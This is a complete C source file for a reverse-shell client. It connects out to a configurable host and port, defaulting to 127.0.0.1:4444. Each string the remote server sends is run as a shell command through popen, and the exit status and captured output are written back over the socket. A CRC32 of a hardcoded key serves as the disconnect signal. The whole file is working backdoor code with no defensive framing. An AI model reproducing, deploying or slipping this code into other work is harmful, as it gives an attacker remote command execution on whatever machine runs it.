#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <zlib.h>
#include <stdint.h>

#define DEFAULT_HOST "127.0.0.1"
#define DEFAULT_PORT "4444"

const char SECRET_KEY[] = "DEAD_LAMER_MADE_THIS_SHIT";

uint32_t calculate_disconnect_hash() { // uint32_t
    return crc32(0L, (const Bytef*)SECRET_KEY, strlen(SECRET_KEY));
}

int main(int argc, char *argv[]) {
    const char *host = DEFAULT_HOST;
    const char *service = DEFAULT_PORT;

    if (argc == 3) {
        host = argv[1];
        service = argv[2];
    } else if (argc != 1) {
        fprintf(stderr, "Usage: %s [<host> <port>]\n", argv[0]);
        return 1;
    }

    struct addrinfo hints = {0};
    struct addrinfo *result;

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int err = getaddrinfo(host, service, &hints, &result);
    if (err != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(err));
        return 1;
    }

    int sfd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sfd == -1) {
        perror("socket");
        freeaddrinfo(result);
        return 1;
    }

    if (connect(sfd, result->ai_addr, result->ai_addrlen) < 0) {
        perror("connect");
        close(sfd);
        freeaddrinfo(result);
        return 1;
    }

    freeaddrinfo(result);

    printf("Connected to server.\n");

    uint32_t expected_disconnect_hash = calculate_disconnect_hash(); // uint32_t
    expected_disconnect_hash = htonl(expected_disconnect_hash);

    while (1) {
        char buffer[1024];
        int len = read(sfd, buffer, sizeof(buffer)-1);
        if (len <= 0) {
            printf("Server disconnected\n");
            break;
        }
        buffer[len] = '\0';

        if (len == 4) {
            uint32_t received_hash; // uint32_t
            memcpy(&received_hash, buffer, 4);
            if(received_hash == expected_disconnect_hash) {
                printf("Disconnecting...\n");
                break;
            }
        }

        printf("Executing: %s\n", buffer);
        FILE *cmd = popen(buffer, "r");
        if (!cmd) {
            perror("popen failed");
            int exit_code = htonl(-1);
            write(sfd, &exit_code, sizeof(exit_code));
            int output_len = htonl(0);
            write(sfd, &output_len, sizeof(output_len));
            continue;
        }

        char output[1024] = {0};
        size_t total_bytes = 0;
        size_t bytes_read;
        char temp_buffer[1025];

        while ((bytes_read = fread(temp_buffer, 1, sizeof(temp_buffer)-1, cmd)) > 0) {
            temp_buffer[bytes_read] = '\0';
            size_t remaining_space = sizeof(output) - total_bytes - 1;
            size_t to_copy = (bytes_read > remaining_space) ? remaining_space : bytes_read;

            if(to_copy > 0) {
                memcpy(output + total_bytes, temp_buffer, to_copy);
                total_bytes += to_copy;
            }
            if(total_bytes >= sizeof(output) - 1) break;
        }

        int status = pclose(cmd);
        int exit_status = WIFEXITED(status) ? WEXITSTATUS(status) : -1;

        int network_exit_status = htonl(exit_status);
        write(sfd, &network_exit_status, sizeof(network_exit_status));

        int output_len_net = htonl(total_bytes);
        write(sfd, &output_len_net, sizeof(output_len_net));

        if (total_bytes > 0) {
            write(sfd, output, total_bytes);
        }
    }

    close(sfd);
    return 0;
}
